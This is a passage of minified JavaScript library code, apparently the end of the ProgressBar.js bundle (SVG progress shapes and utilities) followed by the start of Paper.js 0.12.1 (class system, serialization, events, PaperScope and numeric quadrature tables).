                                            s.isFunction(i) && i();
                                        },
                                    });
                            }),
                            (o.prototype._getComputedDashOffset = function () {
                                var t = window.getComputedStyle(this.path, null);
                                return parseFloat(t.getPropertyValue("stroke-dashoffset"), 10);
                            }),
                            (o.prototype._progressToOffset = function (t) {
                                var e = this.path.getTotalLength();
                                return e - t * e;
                            }),
                            (o.prototype._resolveFromAndTo = function (t, e, i) {
                                return i.from && i.to ? { from: i.from, to: i.to } : { from: this._calculateFrom(e), to: this._calculateTo(t, e) };
                            }),
                            (o.prototype._calculateFrom = function (t) {
                                return n.interpolate(this._opts.from, this._opts.to, this.value(), t);
                            }),
                            (o.prototype._calculateTo = function (t, e) {
                                return n.interpolate(this._opts.from, this._opts.to, t, e);
                            }),
                            (o.prototype._stopTween = function () {
                                null !== this._tweenable && (this._tweenable.stop(), (this._tweenable = null));
                            }),
                            (o.prototype._easing = function (t) {
                                return r.hasOwnProperty(t) ? r[t] : t;
                            }),
                            (e.exports = o);
                    },
                    { "./utils": 9, shifty: 1 },
                ],
                6: [
                    function (t, e, i) {
                        var n = t("./shape"),
                            s = t("./circle"),
                            r = t("./utils"),
                            o = function (t, e) {
                                (this._pathTemplate = "M 50,50 m -{radius},0 a {radius},{radius} 0 1 1 {2radius},0"), (this.containerAspectRatio = 2), n.apply(this, arguments);
                            };
                        ((o.prototype = new n()).constructor = o),
                            (o.prototype._initializeSvg = function (t, e) {
                                t.setAttribute("viewBox", "0 0 100 50");
                            }),
                            (o.prototype._initializeTextContainer = function (t, e, i) {
                                t.text.style && ((i.style.top = "auto"), (i.style.bottom = "0"), t.text.alignToBottom ? r.setStyle(i, "transform", "translate(-50%, 0)") : r.setStyle(i, "transform", "translate(-50%, 50%)"));
                            }),
                            (o.prototype._pathString = s.prototype._pathString),
                            (o.prototype._trailString = s.prototype._trailString),
                            (e.exports = o);
                    },
                    { "./circle": 2, "./shape": 7, "./utils": 9 },
                ],
                7: [
                    function (t, e, i) {
                        var n = t("./path"),
                            s = t("./utils"),
                            r = "Object is destroyed",
                            o = function t(e, i) {
                                if (!(this instanceof t)) throw new Error("Constructor was called without new keyword");
                                if (0 !== arguments.length) {
                                    (this._opts = s.extend(
                                        {
                                            color: "#555",
                                            strokeWidth: 1,
                                            trailColor: null,
                                            trailWidth: null,
                                            fill: null,
                                            text: {
                                                style: { color: null, position: "absolute", left: "50%", top: "50%", padding: 0, margin: 0, transform: { prefix: !0, value: "translate(-50%, -50%)" } },
                                                autoStyleContainer: !0,
                                                alignToBottom: !0,
                                                value: null,
                                                className: "progressbar-text",
                                            },
                                            svgStyle: { display: "block", width: "100%" },
                                            warnings: !1,
                                        },
                                        i,
                                        !0
                                    )),
                                        s.isObject(i) && void 0 !== i.svgStyle && (this._opts.svgStyle = i.svgStyle),
                                        s.isObject(i) && s.isObject(i.text) && void 0 !== i.text.style && (this._opts.text.style = i.text.style);
                                    var r,
                                        o = this._createSvgView(this._opts);
                                    if (!(r = s.isString(e) ? document.querySelector(e) : e)) throw new Error("Container does not exist: " + e);
                                    (this._container = r),
                                        this._container.appendChild(o.svg),
                                        this._opts.warnings && this._warnContainerAspectRatio(this._container),
                                        this._opts.svgStyle && s.setStyles(o.svg, this._opts.svgStyle),
                                        (this.svg = o.svg),
                                        (this.path = o.path),
                                        (this.trail = o.trail),
                                        (this.text = null);
                                    var a = s.extend({ attachment: void 0, shape: this }, this._opts);
                                    (this._progressPath = new n(o.path, a)), s.isObject(this._opts.text) && null !== this._opts.text.value && this.setText(this._opts.text.value);
                                }
                            };
                        (o.prototype.animate = function (t, e, i) {
                            if (null === this._progressPath) throw new Error(r);
                            this._progressPath.animate(t, e, i);
                        }),
                            (o.prototype.stop = function () {
                                if (null === this._progressPath) throw new Error(r);
                                void 0 !== this._progressPath && this._progressPath.stop();
                            }),
                            (o.prototype.destroy = function () {
                                if (null === this._progressPath) throw new Error(r);
                                this.stop(),
                                    this.svg.parentNode.removeChild(this.svg),
                                    (this.svg = null),
                                    (this.path = null),
                                    (this.trail = null),
                                    (this._progressPath = null),
                                    null !== this.text && (this.text.parentNode.removeChild(this.text), (this.text = null));
                            }),
                            (o.prototype.set = function (t) {
                                if (null === this._progressPath) throw new Error(r);
                                this._progressPath.set(t);
                            }),
                            (o.prototype.value = function () {
                                if (null === this._progressPath) throw new Error(r);
                                return void 0 === this._progressPath ? 0 : this._progressPath.value();
                            }),
                            (o.prototype.setText = function (t) {
                                if (null === this._progressPath) throw new Error(r);
                                null === this.text && ((this.text = this._createTextContainer(this._opts, this._container)), this._container.appendChild(this.text)),
                                    s.isObject(t) ? (s.removeChildren(this.text), this.text.appendChild(t)) : (this.text.innerHTML = t);
                            }),
                            (o.prototype._createSvgView = function (t) {
                                var e = document.createElementNS("http://www.w3.org/2000/svg", "svg");
                                this._initializeSvg(e, t);
                                var i = null;
                                (t.trailColor || t.trailWidth) && ((i = this._createTrail(t)), e.appendChild(i));
                                var n = this._createPath(t);
                                return e.appendChild(n), { svg: e, path: n, trail: i };
                            }),
                            (o.prototype._initializeSvg = function (t, e) {
                                t.setAttribute("viewBox", "0 0 100 100");
                            }),
                            (o.prototype._createPath = function (t) {
                                var e = this._pathString(t);
                                return this._createPathElement(e, t);
                            }),
                            (o.prototype._createTrail = function (t) {
                                var e = this._trailString(t),
                                    i = s.extend({}, t);
                                return i.trailColor || (i.trailColor = "#eee"), i.trailWidth || (i.trailWidth = i.strokeWidth), (i.color = i.trailColor), (i.strokeWidth = i.trailWidth), (i.fill = null), this._createPathElement(e, i);
                            }),
                            (o.prototype._createPathElement = function (t, e) {
                                var i = document.createElementNS("http://www.w3.org/2000/svg", "path");
                                return i.setAttribute("d", t), i.setAttribute("stroke", e.color), i.setAttribute("stroke-width", e.strokeWidth), e.fill ? i.setAttribute("fill", e.fill) : i.setAttribute("fill-opacity", "0"), i;
                            }),
                            (o.prototype._createTextContainer = function (t, e) {
                                var i = document.createElement("div");
                                i.className = t.text.className;
                                var n = t.text.style;
                                return n && (t.text.autoStyleContainer && (e.style.position = "relative"), s.setStyles(i, n), n.color || (i.style.color = t.color)), this._initializeTextContainer(t, e, i), i;
                            }),
                            (o.prototype._initializeTextContainer = function (t, e, i) {}),
                            (o.prototype._pathString = function (t) {
                                throw new Error("Override this function for each progress bar");
                            }),
                            (o.prototype._trailString = function (t) {
                                throw new Error("Override this function for each progress bar");
                            }),
                            (o.prototype._warnContainerAspectRatio = function (t) {
                                if (this.containerAspectRatio) {
                                    var e = window.getComputedStyle(t, null),
                                        i = parseFloat(e.getPropertyValue("width"), 10),
                                        n = parseFloat(e.getPropertyValue("height"), 10);
                                    s.floatEquals(this.containerAspectRatio, i / n) ||
                                        (console.warn("Incorrect aspect ratio of container", "#" + t.id, "detected:", e.getPropertyValue("width") + "(width)", "/", e.getPropertyValue("height") + "(height)", "=", i / n),
                                        console.warn("Aspect ratio of should be", this.containerAspectRatio));
                                }
                            }),
                            (e.exports = o);
                    },
                    { "./path": 5, "./utils": 9 },
                ],
                8: [
                    function (t, e, i) {
                        var n = t("./shape"),
                            s = t("./utils"),
                            r = function (t, e) {
                                (this._pathTemplate = "M 0,{halfOfStrokeWidth} L {width},{halfOfStrokeWidth} L {width},{width} L {halfOfStrokeWidth},{width} L {halfOfStrokeWidth},{strokeWidth}"),
                                    (this._trailTemplate = "M {startMargin},{halfOfStrokeWidth} L {width},{halfOfStrokeWidth} L {width},{width} L {halfOfStrokeWidth},{width} L {halfOfStrokeWidth},{halfOfStrokeWidth}"),
                                    n.apply(this, arguments);
                            };
                        ((r.prototype = new n()).constructor = r),
                            (r.prototype._pathString = function (t) {
                                var e = 100 - t.strokeWidth / 2;
                                return s.render(this._pathTemplate, { width: e, strokeWidth: t.strokeWidth, halfOfStrokeWidth: t.strokeWidth / 2 });
                            }),
                            (r.prototype._trailString = function (t) {
                                var e = 100 - t.strokeWidth / 2;
                                return s.render(this._trailTemplate, { width: e, strokeWidth: t.strokeWidth, halfOfStrokeWidth: t.strokeWidth / 2, startMargin: t.strokeWidth / 2 - t.trailWidth / 2 });
                            }),
                            (e.exports = r);
                    },
                    { "./shape": 7, "./utils": 9 },
                ],
                9: [
                    function (t, e, i) {
                        function n(t, e, i) {
                            for (var n = t.style, r = 0; r < a.length; ++r) {
                                n[a[r] + s(e)] = i;
                            }
                            n[e] = i;
                        }
                        function s(t) {
                            return t.charAt(0).toUpperCase() + t.slice(1);
                        }
                        function r(t) {
                            return (e = t), "[object Array]" !== Object.prototype.toString.call(e) && "object" === typeof t && !!t;
                            var e;
                        }
                        function o(t, e) {
                            for (var i in t)
                                if (t.hasOwnProperty(i)) {
                                    e(t[i], i);
                                }
                        }
                        var a = "Webkit Moz O ms".split(" "),
                            l = 0.001;
                        e.exports = {
                            extend: function t(e, i, n) {
                                for (var s in ((e = e || {}), (n = n || !1), (i = i || {})))
                                    if (i.hasOwnProperty(s)) {
                                        var o = e[s],
                                            a = i[s];
                                        n && r(o) && r(a) ? (e[s] = t(o, a, n)) : (e[s] = a);
                                    }
                                return e;
                            },
                            render: function (t, e) {
                                var i = t;
                                for (var n in e)
                                    if (e.hasOwnProperty(n)) {
                                        var s = e[n],
                                            r = new RegExp("\\{" + n + "\\}", "g");
                                        i = i.replace(r, s);
                                    }
                                return i;
                            },
                            setStyle: n,
                            setStyles: function (t, e) {
                                o(e, function (e, i) {
                                    null != e && (r(e) && !0 === e.prefix ? n(t, i, e.value) : (t.style[i] = e));
                                });
                            },
                            capitalize: s,
                            isString: function (t) {
                                return "string" == typeof t || t instanceof String;
                            },
                            isFunction: function (t) {
                                return "function" == typeof t;
                            },
                            isObject: r,
                            forEachObject: o,
                            floatEquals: function (t, e) {
                                return Math.abs(t - e) < l;
                            },
                            removeChildren: function (t) {
                                for (; t.firstChild; ) t.removeChild(t.firstChild);
                            },
                        };
                    },
                    {},
                ],
            },
            {},
            [4]
        )(4);
    });
var paper = function (t, e) {
    var i = (t = t || require("./node/self.js")).window,
        n = t.document,
        s = new (function () {
            var t = /^(statics|enumerable|beans|preserve)$/,
                i = [],
                n = i.slice,
                s = Object.create,
                r = Object.getOwnPropertyDescriptor,
                o = Object.defineProperty,
                a =
                    i.forEach ||
                    function (t, e) {
                        for (var i = 0, n = this.length; i < n; i++) t.call(e, this[i], i, this);
                    },
                l =
                    Object.assign ||
                    function (t) {
                        for (var e = 1, i = arguments.length; e < i; e++) {
                            var n = arguments[e];
                            for (var s in n) n.hasOwnProperty(s) && (t[s] = n[s]);
                        }
                        return t;
                    },
                h = function (t, e, i) {
                    if (t) {
                        var n = r(t, "length");
                        (n && "number" == typeof n.value
                            ? a
                            : function (t, e) {
                                  for (var i in this) this.hasOwnProperty(i) && t.call(e, this[i], i, this);
                              }
                        ).call(t, e, (i = i || t));
                    }
                    return i;
                };
            function u(e, i, n, s, a) {
                var l = {};
                function h(t, h) {
                    "string" == typeof (h = h || ((h = r(i, t)) && (h.get ? h : h.value))) && "#" === h[0] && (h = e[h.substring(1)] || h);
                    var u,
                        d = "function" == typeof h,
                        f = h,
                        p = a || (d && !h.base) ? (h && h.get ? t in e : e[t]) : null;
                    (a && p) ||
                        (d && p && (h.base = p),
                        d && !1 !== s && (u = t.match(/^([gs]et|is)(([A-Z])(.*))$/)) && (l[u[3].toLowerCase() + u[4]] = u[2]),
                        (f && !d && f.get && "function" == typeof f.get && c.isPlainObject(f)) || (f = { value: f, writable: !0 }),
                        (r(e, t) || { configurable: !0 }).configurable && ((f.configurable = !0), (f.enumerable = null != n ? n : !u)),
                        o(e, t, f));
                }
                if (i) {
                    for (var u in i) i.hasOwnProperty(u) && !t.test(u) && h(u);
                    for (var u in l) {
                        var d = l[u],
                            f = e["set" + d],
                            p = e["get" + d] || (f && e["is" + d]);
                        !p || (!0 !== s && 0 !== p.length) || h(u, { get: p, set: f });
                    }
                }
                return e;
            }
            function c() {
                for (var t = 0, e = arguments.length; t < e; t++) {
                    var i = arguments[t];
                    i && l(this, i);
                }
                return this;
            }
            return u(c, {
                inject: function (t) {
                    if (t) {
                        var e = !0 === t.statics ? t : t.statics,
                            i = t.beans,
                            n = t.preserve;
                        e !== t && u(this.prototype, t, t.enumerable, i, n), u(this, e, null, i, n);
                    }
                    for (var s = 1, r = arguments.length; s < r; s++) this.inject(arguments[s]);
                    return this;
                },
                extend: function () {
                    for (var t, e, i, n = this, r = 0, a = arguments.length; r < a && (!t || !e); r++) (i = arguments[r]), (t = t || i.initialize), (e = e || i.prototype);
                    return (
                        (e = (t =
                            t ||
                            function () {
                                n.apply(this, arguments);
                            }).prototype = e || s(this.prototype)),
                        o(e, "constructor", { value: t, writable: !0, configurable: !0 }),
                        u(t, this),
                        arguments.length && this.inject.apply(t, arguments),
                        (t.base = n),
                        t
                    );
                },
            }).inject({
                enumerable: !1,
                initialize: c,
                set: c,
                inject: function () {
                    for (var t = 0, e = arguments.length; t < e; t++) {
                        var i = arguments[t];
                        i && u(this, i, i.enumerable, i.beans, i.preserve);
                    }
                    return this;
                },
                extend: function () {
                    var t = s(this);
                    return t.inject.apply(t, arguments);
                },
                each: function (t, e) {
                    return h(this, t, e);
                },
                clone: function () {
                    return new this.constructor(this);
                },
                statics: {
                    set: l,
                    each: h,
                    create: s,
                    define: o,
                    describe: r,
                    clone: function (t) {
                        return l(new t.constructor(), t);
                    },
                    isPlainObject: function (t) {
                        var e = null != t && t.constructor;
                        return e && (e === Object || e === c || "Object" === e.name);
                    },
                    pick: function (t, i) {
                        return t !== e ? t : i;
                    },
                    slice: function (t, e, i) {
                        return n.call(t, e, i);
                    },
                },
            });
        })();
    "undefined" != typeof module && (module.exports = s),
        s.inject(
            {
                enumerable: !1,
                toString: function () {
                    return null != this._id
                        ? (this._class || "Object") + (this._name ? " '" + this._name + "'" : " @" + this._id)
                        : "{ " +
                              s
                                  .each(
                                      this,
                                      function (t, e) {
                                          if (!/^_/.test(e)) {
                                              var i = typeof t;
                                              this.push(e + ": " + ("number" === i ? l.instance.number(t) : "string" === i ? "'" + t + "'" : t));
                                          }
                                      },
                                      []
                                  )
                                  .join(", ") +
                              " }";
                },
                getClassName: function () {
                    return this._class || "";
                },
                importJSON: function (t) {
                    return s.importJSON(t, this);
                },
                exportJSON: function (t) {
                    return s.exportJSON(this, t);
                },
                toJSON: function () {
                    return s.serialize(this);
                },
                set: function (t, e) {
                    return t && s.filter(this, t, e, this._prioritize), this;
                },
            },
            {
                beans: !1,
                statics: {
                    exports: {},
                    extend: function t() {
                        var e = t.base.apply(this, arguments),
                            i = e.prototype._class;
                        return i && !s.exports[i] && (s.exports[i] = e), e;
                    },
                    equals: function (t, e) {
                        if (t === e) return !0;
                        if (t && t.equals) return t.equals(e);
                        if (e && e.equals) return e.equals(t);
                        if (t && e && "object" == typeof t && "object" == typeof e) {
                            if (Array.isArray(t) && Array.isArray(e)) {
                                if ((i = t.length) !== e.length) return !1;
                                for (; i--; ) if (!s.equals(t[i], e[i])) return !1;
                            } else {
                                var i,
                                    n = Object.keys(t);
                                if ((i = n.length) !== Object.keys(e).length) return !1;
                                for (; i--; ) {
                                    var r = n[i];
                                    if (!e.hasOwnProperty(r) || !s.equals(t[r], e[r])) return !1;
                                }
                            }
                            return !0;
                        }
                        return !1;
                    },
                    read: function (t, i, n, r) {
                        if (this === s) {
                            var o = this.peek(t, i);
                            return t.__index++, o;
                        }
                        var a = this.prototype,
                            l = a._readIndex,
                            h = i || (l && t.__index) || 0,
                            u = t.length,
                            c = t[h];
                        if (((r = r || u - h), c instanceof this || (n && n.readNull && null == c && r <= 1))) return l && (t.__index = h + 1), c && n && n.clone ? c.clone() : c;
                        if (((c = s.create(a)), l && (c.__read = !0), (c = c.initialize.apply(c, h > 0 || h + r < u ? s.slice(t, h, h + r) : t) || c), l)) {
                            t.__index = h + c.__read;
                            var d = c.__filtered;
                            d && ((t.__filtered = d), (c.__filtered = e)), (c.__read = e);
                        }
                        return c;
                    },
                    peek: function (t, e) {
                        return t[(t.__index = e || t.__index || 0)];
                    },
                    remain: function (t) {
                        return t.length - (t.__index || 0);
                    },
                    readList: function (t, e, i, n) {
                        for (var s, r = [], o = e || 0, a = n ? o + n : t.length, l = o; l < a; l++) r.push(Array.isArray((s = t[l])) ? this.read(s, 0, i) : this.read(t, l, i, 1));
                        return r;
                    },
                    readNamed: function (t, i, n, r, o) {
                        var a = this.getNamed(t, i),
                            l = a !== e;
                        if (l) {
                            var h = t.__filtered;
                            h || ((h = t.__filtered = s.create(t[0])).__unfiltered = t[0]), (h[i] = e);
                        }
                        var u = l ? [a] : t;
                        return this.read(u, n, r, o);
                    },
                    getNamed: function (t, i) {
                        var n = t[0];
                        if ((t._hasObject === e && (t._hasObject = 1 === t.length && s.isPlainObject(n)), t._hasObject)) return i ? n[i] : t.__filtered || n;
                    },
                    hasNamed: function (t, e) {
                        return !!this.getNamed(t, e);
                    },
                    filter: function (t, i, n, s) {
                        var r;
                        function o(s) {
                            if (!((n && s in n) || (r && s in r))) {
                                var o = i[s];
                                o !== e && (t[s] = o);
                            }
                        }
                        if (s) {
                            for (var a, l = {}, h = 0, u = s.length; h < u; h++) (a = s[h]) in i && (o(a), (l[a] = !0));
                            r = l;
                        }
                        return Object.keys(i.__unfiltered || i).forEach(o), t;
                    },
                    isPlainValue: function (t, e) {
                        return s.isPlainObject(t) || Array.isArray(t) || (e && "string" == typeof t);
                    },
                    serialize: function (t, e, i, n) {
                        e = e || {};
                        var r,
                            o = !n;
                        if (
                            (o &&
                                ((e.formatter = new l(e.precision)),
                                (n = {
                                    length: 0,
                                    definitions: {},
                                    references: {},
                                    add: function (t, e) {
                                        var i = "#" + t._id,
                                            n = this.references[i];
                                        if (!n) {
                                            this.length++;
                                            var s = e.call(t),
                                                r = t._class;
                                            r && s[0] !== r && s.unshift(r), (this.definitions[i] = s), (n = this.references[i] = [i]);
                                        }
                                        return n;
                                    },
                                })),
                            t && t._serialize)
                        ) {
                            r = t._serialize(e, n);
                            var a = t._class;
                            !a || t._compactSerialize || (!o && i) || r[0] === a || r.unshift(a);
                        } else if (Array.isArray(t)) {
                            r = [];
                            for (var h = 0, u = t.length; h < u; h++) r[h] = s.serialize(t[h], e, i, n);
                        } else if (s.isPlainObject(t)) {
                            r = {};
                            var c = Object.keys(t);
                            for (h = 0, u = c.length; h < u; h++) {
                                var d = c[h];
                                r[d] = s.serialize(t[d], e, i, n);
                            }
                        } else r = "number" == typeof t ? e.formatter.number(t, e.precision) : t;
                        return o && n.length > 0 ? [["dictionary", n.definitions], r] : r;
                    },
                    deserialize: function (t, e, i, n, r) {
                        var o = t,
                            a = !i,
                            l = a && t && t.length && "dictionary" === t[0][0];
                        if (((i = i || {}), Array.isArray(t))) {
                            var h = t[0],
                                u = "dictionary" === h;
                            if (1 == t.length && /^#/.test(h)) return i.dictionary[h];
                            o = [];
                            for (var c = (h = s.exports[h]) ? 1 : 0, d = t.length; c < d; c++) o.push(s.deserialize(t[c], e, i, u, l));
                            if (h) {
                                var f = o;
                                o = e ? e(h, f, a || r) : new h(f);
                            }
                        } else if (s.isPlainObject(t)) for (var p in ((o = {}), n && (i.dictionary = o), t)) o[p] = s.deserialize(t[p], e, i);
                        return l ? o[1] : o;
                    },
                    exportJSON: function (t, e) {
                        var i = s.serialize(t, e);
                        return e && 0 == e.asString ? i : JSON.stringify(i);
                    },
                    importJSON: function (t, e) {
                        return s.deserialize("string" == typeof t ? JSON.parse(t) : t, function (t, i, n) {
                            var r = n && e && e.constructor === t,
                                o = r ? e : s.create(t.prototype);
                            if (1 === i.length && o instanceof w && (r || !(o instanceof b))) {
                                var a = i[0];
                                s.isPlainObject(a) && (a.insert = !1);
                            }
                            return (r ? o.set : t).apply(o, i), r && (e = null), o;
                        });
                    },
                    push: function (t, e) {
                        var i = e.length;
                        if (i < 4096) t.push.apply(t, e);
                        else {
                            var n = t.length;
                            t.length += i;
                            for (var s = 0; s < i; s++) t[n + s] = e[s];
                        }
                        return t;
                    },
                    splice: function (t, i, n, r) {
                        var o = i && i.length,
                            a = n === e;
                        (n = a ? t.length : n) > t.length && (n = t.length);
                        for (var l = 0; l < o; l++) i[l]._index = n + l;
                        if (a) return s.push(t, i), [];
                        var h = [n, r];
                        i && s.push(h, i);
                        for (var u = t.splice.apply(t, h), c = ((l = 0), u.length); l < c; l++) u[l]._index = e;
                        for (l = n + o, c = t.length; l < c; l++) t[l]._index = l;
                        return u;
                    },
                    capitalize: function (t) {
                        return t.replace(/\b[a-z]/g, function (t) {
                            return t.toUpperCase();
                        });
                    },
                    camelize: function (t) {
                        return t.replace(/-(.)/g, function (t, e) {
                            return e.toUpperCase();
                        });
                    },
                    hyphenate: function (t) {
                        return t.replace(/([a-z])([A-Z])/g, "$1-$2").toLowerCase();
                    },
                },
            }
        );
    var r = {
            on: function (t, e) {
                if ("string" != typeof t)
                    s.each(
                        t,
                        function (t, e) {
                            this.on(e, t);
                        },
                        this
                    );
                else {
                    var i = this._eventTypes,
                        n = i && i[t],
                        r = (this._callbacks = this._callbacks || {});
                    -1 === (r = r[t] = r[t] || []).indexOf(e) && (r.push(e), n && n.install && 1 === r.length && n.install.call(this, t));
                }
                return this;
            },
            off: function (t, e) {
                if ("string" == typeof t) {
                    var i,
                        n = this._eventTypes,
                        r = n && n[t],
                        o = this._callbacks && this._callbacks[t];
                    return o && (!e || (-1 !== (i = o.indexOf(e)) && 1 === o.length) ? (r && r.uninstall && r.uninstall.call(this, t), delete this._callbacks[t]) : -1 !== i && o.splice(i, 1)), this;
                }
                s.each(
                    t,
                    function (t, e) {
                        this.off(e, t);
                    },
                    this
                );
            },
            once: function (t, e) {
                return this.on(t, function i() {
                    e.apply(this, arguments), this.off(t, i);
                });
            },
            emit: function (t, e) {
                var i = this._callbacks && this._callbacks[t];
                if (!i) return !1;
                var n = s.slice(arguments, 1),
                    r = e && e.target && !e.currentTarget;
                (i = i.slice()), r && (e.currentTarget = this);
                for (var o = 0, a = i.length; o < a; o++)
                    if (0 == i[o].apply(this, n)) {
                        e && e.stop && e.stop();
                        break;
                    }
                return r && delete e.currentTarget, !0;
            },
            responds: function (t) {
                return !(!this._callbacks || !this._callbacks[t]);
            },
            attach: "#on",
            detach: "#off",
            fire: "#emit",
            _installEvents: function (t) {
                var e = this._eventTypes,
                    i = this._callbacks,
                    n = t ? "install" : "uninstall";
                if (e)
                    for (var s in i)
                        if (i[s].length > 0) {
                            var r = e[s],
                                o = r && r[n];
                            o && o.call(this, s);
                        }
            },
            statics: {
                inject: function t(e) {
                    var i = e._events;
                    if (i) {
                        var n = {};
                        s.each(i, function (t, i) {
                            var r = "string" == typeof t,
                                o = r ? t : i,
                                a = s.capitalize(o),
                                l = o.substring(2).toLowerCase();
                            (n[l] = r ? {} : t),
                                (o = "_" + o),
                                (e["get" + a] = function () {
                                    return this[o];
                                }),
                                (e["set" + a] = function (t) {
                                    var e = this[o];
                                    e && this.off(l, e), t && this.on(l, t), (this[o] = t);
                                });
                        }),
                            (e._eventTypes = n);
                    }
                    return t.base.apply(this, arguments);
                },
            },
        },
        o = s.extend({
            _class: "PaperScope",
            initialize: function e() {
                (st = this), (this.settings = new s({ applyMatrix: !0, insertItems: !0, handleSize: 4, hitTolerance: 0 })), (this.project = null), (this.projects = []), (this.tools = []), (this._id = e._id++), (e._scopes[this._id] = this);
                var i = e.prototype;
                if (!this.support) {
                    var n = tt.getContext(1, 1) || {};
                    (i.support = { nativeDash: "setLineDash" in n || "mozDash" in n, nativeBlendModes: et.nativeModes }), tt.release(n);
                }
                if (!this.agent) {
                    var r = t.navigator.userAgent.toLowerCase(),
                        o = (/(darwin|win|mac|linux|freebsd|sunos)/.exec(r) || [])[0],
                        a = "darwin" === o ? "mac" : o,
                        l = (i.agent = i.browser = { platform: a });
                    a && (l[a] = !0),
                        r.replace(/(opera|chrome|safari|webkit|firefox|msie|trident|atom|node|jsdom)\/?\s*([.\d]+)(?:.*version\/([.\d]+))?(?:.*rv\:v?([.\d]+))?/g, function (t, e, i, n, s) {
                            if (!l.chrome) {
                                var r = "opera" === e ? n : /^(node|trident)$/.test(e) ? s : i;
                                (l.version = r), (l.versionNumber = parseFloat(r)), (e = "trident" === e ? "msie" : e), (l.name = e), (l[e] = !0);
                            }
                        }),
                        l.chrome && delete l.webkit,
                        l.atom && delete l.chrome,
                        (l.node = l.jsdom);
                }
            },
            version: "0.12.1",
            getView: function () {
                var t = this.project;
                return t && t._view;
            },
            getPaper: function () {
                return this;
            },
            execute: function (t, e) {},
            install: function (t) {
                var e = this;
                for (var i in (s.each(["project", "view", "tool"], function (i) {
                    s.define(t, i, {
                        configurable: !0,
                        get: function () {
                            return e[i];
                        },
                    });
                }),
                this))
                    !/^_/.test(i) && this[i] && (t[i] = this[i]);
            },
            setup: function (t) {
                return (st = this), (this.project = new y(t)), this;
            },
            createCanvas: function (t, e) {
                return tt.getCanvas(t, e);
            },
            activate: function () {
                st = this;
            },
            clear: function () {
                for (var t = this.projects, e = this.tools, i = t.length - 1; i >= 0; i--) t[i].remove();
                for (i = e.length - 1; i >= 0; i--) e[i].remove();
            },
            remove: function () {
                this.clear(), delete o._scopes[this._id];
            },
            statics: new (function () {
                function t(t) {
                    return (
                        (t += "Attribute"),
                        function (e, i) {
                            return e[t](i) || e[t]("data-paper-" + i);
                        }
                    );
                }
                return {
                    _scopes: {},
                    _id: 0,
                    get: function (t) {
                        return this._scopes[t] || null;
                    },
                    getAttribute: t("get"),
                    hasAttribute: t("has"),
                };
            })(),
        }),
        a = s.extend(r, {
            initialize: function (t) {
                (this._scope = st), (this._index = this._scope[this._list].push(this) - 1), (!t && this._scope[this._reference]) || this.activate();
            },
            activate: function () {
                if (!this._scope) return !1;
                var t = this._scope[this._reference];
                return t && t !== this && t.emit("deactivate"), (this._scope[this._reference] = this), this.emit("activate", t), !0;
            },
            isActive: function () {
                return this._scope[this._reference] === this;
            },
            remove: function () {
                return null != this._index && (s.splice(this._scope[this._list], null, this._index, 1), this._scope[this._reference] == this && (this._scope[this._reference] = null), (this._scope = null), !0);
            },
            getView: function () {
                return this._scope.getView();
            },
        }),
        l = s.extend({
            initialize: function (t) {
                (this.precision = s.pick(t, 5)), (this.multiplier = Math.pow(10, this.precision));
            },
            number: function (t) {
                return this.precision < 16 ? Math.round(t * this.multiplier) / this.multiplier : t;
            },
            pair: function (t, e, i) {
                return this.number(t) + (i || ",") + this.number(e);
            },
            point: function (t, e) {
                return this.number(t.x) + (e || ",") + this.number(t.y);
            },
            size: function (t, e) {
                return this.number(t.width) + (e || ",") + this.number(t.height);
            },
            rectangle: function (t, e) {
                return this.point(t, e) + (e || ",") + this.size(t, e);
            },
        });
    l.instance = new l();
    var h = new (function () {
            var t = [
                    [0.5773502691896257],
                    [0, 0.7745966692414834],
                    [0.33998104358485626, 0.8611363115940526],
                    [0, 0.5384693101056831, 0.906179845938664],
                    [0.2386191860831969, 0.6612093864662645, 0.932469514203152],
                    [0, 0.4058451513773972, 0.7415311855993945, 0.9491079123427585],
                    [0.1834346424956498, 0.525532409916329, 0.7966664774136267, 0.9602898564975363],
                    [0, 0.3242534234038089, 0.6133714327005904, 0.8360311073266358, 0.9681602395076261],
                    [0.14887433898163122, 0.4333953941292472, 0.6794095682990244, 0.8650633666889845, 0.9739065285171717],
                    [0, 0.26954315595234496, 0.5190961292068118, 0.7301520055740494, 0.8870625997680953, 0.978228658146057],
                    [0.1252334085114689, 0.3678314989981802, 0.5873179542866175, 0.7699026741943047, 0.9041172563704749, 0.9815606342467192],
                    [0, 0.2304583159551348, 0.44849275103644687, 0.6423493394403402, 0.8015780907333099, 0.9175983992229779, 0.9841830547185881],
                    [0.10805494870734367, 0.31911236892788974, 0.5152486363581541, 0.6872929048116855, 0.827201315069765, 0.9284348836635735, 0.9862838086968123],
                    [0, 0.20119409399743451, 0.3941513470775634, 0.5709721726085388, 0.7244177313601701, 0.8482065834104272, 0.937273392400706, 0.9879925180204854],
                    [0.09501250983763744, 0.2816035507792589, 0.45801677765722737, 0.6178762444026438, 0.755404408355003, 0.8656312023878318, 0.9445750230732326, 0.9894009349916499],
                ],
                e = [
                    [1],
                    [0.8888888888888888, 0.5555555555555556],
                    [0.6521451548625461, 0.34785484513745385],
                    [0.5688888888888889, 0.47862867049936647, 0.23692688505618908],
                    [0.46791393457269104, 0.3607615730481386, 0.17132449237917036],
                    [0.4179591836734694, 0.3818300505051189, 0.27970539148927664, 0.1294849661688697],
                    [0.362683783378362, 0.31370664587788727, 0.22238103445337448, 0.10122853629037626],
                    [0.3302393550012598, 0.31234707704000286, 0.26061069640293544, 0.1806481606948574, 0.08127438836157441],
                    [0.29552422471475287, 0.26926671930999635, 0.21908636251598204, 0.1494513491505806, 0.06667134430868814],
                    [0.2729250867779006, 0.26280454451024665, 0.23319376459199048, 0.18629021092773426, 0.1255803694649046, 0.05566856711617366],
                    [0.24914704581340277, 0.2334925365383548, 0.20316742672306592, 0.16007832854334622, 0.10693932599531843, 0.04717533638651183],
                    [0.2325515532308739, 0.22628318026289723, 0.2078160475368885, 0.17814598076194574, 0.13887351021978725, 0.09212149983772845, 0.04048400476531588],
                    [0.2152638534631578, 0.2051984637212956, 0.18553839747793782, 0.15720316715819355, 0.12151857068790319, 0.08015808715976021, 0.03511946033175186],
                    [0.2025782419255613, 0.19843148532711158, 0.1861610000155622, 0.16626920581699392, 0.13957067792615432, 0.10715922046717194, 0.07036604748810812, 0.03075324199611727],
                    [0.1894506104550685, 0.18260341504492358, 0.16915651939500254, 0.14959598881657674, 0.12462897125553388, 0.09515851168249279, 0.062253523938647894, 0.027152459411754096],
                ],
                i = Math.abs,
                n = Math.sqrt,
                s = Math.pow,
                r =
                    Math.log2 ||
                    function (t) {
                        return Math.log(t) * Math.LOG2E;
                    },
                o = 1e-12,
